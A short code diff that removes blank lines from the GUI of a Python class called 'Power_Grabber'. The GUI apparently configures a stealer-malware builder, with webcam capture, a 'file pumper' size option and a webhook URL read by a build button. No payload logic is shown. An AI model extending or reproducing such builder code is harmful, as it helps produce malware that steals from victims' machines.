@@ -209,7 +209,6 @@ class Power_Grabber(ctk.CTk):
         webcam_checkbox = checkbox_dict['Webcam']
         pumper_frame = ctk.CTkFrame(page, fg_color='transparent')
         pumper_frame.pack(fill=X, pady=(20, 0))
-
         pumper_label = ctk.CTkLabel(pumper_frame, text='File Pumper (MB):', 
                                     font=('Arial', 16))
         pumper_label.pack(side=LEFT, padx=(0, 10))
@@ -223,10 +222,8 @@ class Power_Grabber(ctk.CTk):
                                     fg_color='#FF3535', text_color='white', border_color='#FF3535', 
                                     corner_radius=12, state="readonly", button_color='#FF3535', button_hover_color='#FF3535')
         ping_combo.pack(side=LEFT, padx=(10, 0), pady=(5, 5))
-
         spacer = ctk.CTkFrame(pumper_frame, width=20, fg_color='transparent')
         spacer.pack(side=LEFT, fill=X, expand=True)
-
         def build_button_clicked(event):
             webhook_url = webhook_entry.get()
             file_name = filename_entry.get()
